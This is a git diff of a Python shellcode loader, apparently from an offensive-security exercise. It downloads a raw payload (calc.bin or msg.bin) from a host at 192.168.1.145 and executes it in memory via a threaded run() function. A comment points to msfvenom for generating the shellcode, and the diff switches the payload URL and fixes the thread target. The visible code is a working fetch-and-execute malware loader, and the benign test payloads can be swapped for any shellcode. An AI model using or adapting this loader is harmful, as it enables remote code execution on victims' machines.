@@ -4,10 +4,10 @@ import base64
 import ctypes
 import threading
 
-# URL = 'http://192.168.1.145/mspaint.bin'
-# URL = 'http://192.168.1.145/calc.bin'
-URL = 'http://192.168.1.145/msg.bin'
-# URL = 'http://192.168.1.145/empty.bin'
+
+URL = 'http://192.168.1.145/calc.bin'
+# URL = 'http://192.168.1.145/msg.bin'
+
 
 #? Proper syntax for shellcode creation in msfvenom for a 64 bit system is:
 
@@ -113,13 +113,11 @@ def run(shellcode):
 if __name__ == '__main__':
     url = URL
     shellcode = get_code(URL)
-
     # print(shellcode)
-    # shellcode = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 
     try:
-        run(shellcode)
-        exe_shell = threading.Thread(target='run', args=(shellcode,))
+        # run(shellcode)
+        exe_shell = threading.Thread(target=run, args=(shellcode,))
         exe_shell.run()
     except Exception as e:
         print(f'Will Python crash?  {e}')
